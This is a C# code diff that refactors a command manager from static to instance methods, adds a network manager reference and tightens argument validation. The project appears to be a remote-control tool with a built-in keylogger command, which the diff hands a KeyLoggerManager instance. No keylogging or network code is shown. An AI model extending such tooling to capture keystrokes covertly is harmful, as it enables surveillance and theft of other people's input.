@@ -7,18 +7,20 @@ using Shared;
 
 namespace Commands
 {
-    public static class CommandsManager
+    public class CommandsManager
     {
         /// <summary>
         /// List of all Command classes
         /// </summary>
-        public static List<ICommand> commandList;
+        public List<ICommand> commandList;
+
+        internal static NetworkManager networkManager { get; set; }
 
 
         /// <summary>
         /// Constructor, fill commandList with the classes implementing the ICommand interface
         /// </summary>
-        static CommandsManager()
+        public CommandsManager(NetworkManager networkManager)
         {
             var type = typeof(ICommand);
 
@@ -27,6 +29,8 @@ namespace Commands
                 .Where(t => type.IsAssignableFrom(t) && !t.IsInterface)
                 .Select(t => (ICommand)Activator.CreateInstance(t))
                 .ToList();
+
+            CommandsManager.networkManager = networkManager;
         }
 
 
@@ -35,7 +39,7 @@ namespace Commands
         /// </summary>
         /// <param name="commandName">Command name to find</param>
         /// <returns>Found ICommand or null</returns>
-        public static ICommand GetCommandByName(string commandName) => SearchCommand(s => s.name == commandName);
+        public ICommand GetCommandByName(string commandName) => SearchCommand(s => s.name == commandName);
 
 
         /// <summary>
@@ -43,7 +47,7 @@ namespace Commands
         /// </summary>
         /// <param name="predicate">Predicate to use to find the command</param>
         /// <returns>Found ICommand or null</returns>
-        static ICommand SearchCommand(Func<ICommand, bool> predicate)
+        public ICommand SearchCommand(Func<ICommand, bool> predicate)
         {
             ICommand foundCommand;
             try
@@ -65,9 +69,9 @@ namespace Commands
         /// <param name="command">Invoked Command</param>
         /// <param name="arguments">Passed arguments</param>
         /// <returns>Correct syntax boolean</returns>
-        public static bool CheckCommandSyntax(ICommand command, List<string> arguments)
+        public bool CheckCommandSyntax(ICommand command, List<string> arguments)
         {
-            if (command.validArguments == null)
+            if (command.validArguments == null || command.validArguments.Any(string.IsNullOrEmpty))
             {
                 return arguments.Count == 0;
             }
@@ -113,14 +117,14 @@ namespace Commands
         /// the help message is composed of the Command's description and its syntaxHelper
         /// </summary>
         /// <param name="command">Command to show the help for</param>
-        public static void ShowCommandHelp(ICommand command)
+        public void ShowCommandHelp(ICommand command)
         => ColorTools.WriteMessage($"{command.description}\nSyntax : {command.syntaxHelper}");
         
 
         /// <summary>
         /// Display an help message for all the Commands on the client console, calls ShowCommandHelp
         /// </summary>
-        public static void ShowGlobalHelp()
+        public void ShowGlobalHelp()
         {
             ColorTools.WriteMessage("+-----------------+\n|   Global help   |\n+-----------------+");
             foreach (var command in commandList)
@@ -137,7 +141,7 @@ namespace Commands
         /// This method should only be called by the MainWindow
         /// </summary>
         /// <param name="manager">KeyLoggerManager instance</param>
-        public static void PassKeyloggerManagerInstance(KeyLoggerManager manager)
+        public void PassKeyloggerManagerInstance(KeyLoggerManager manager)
         {
             var keyloggerCommandInstance = (KeyLogger)commandList.Find(x => x.name == "keylogger");
             keyloggerCommandInstance.GetKeyLoggerManagerInstance(manager);
@@ -168,7 +172,7 @@ namespace Commands
             result += horizontalDelimiter;
 
             return result;
-        }
+        }// todo : move to shared project
 
 
         /// <summary>
@@ -176,7 +180,7 @@ namespace Commands
         /// </summary>
         /// <param name="commandString">String to process</param>
         /// <returns>List of string</returns>
-        public static List<string> GetSplittedCommand(string commandString)
+        public List<string> GetSplittedCommand(string commandString)
         {
             return Regex.Matches(commandString, @"[\""].+?[\""]|[^ ]+")
                 .Cast<Match>()
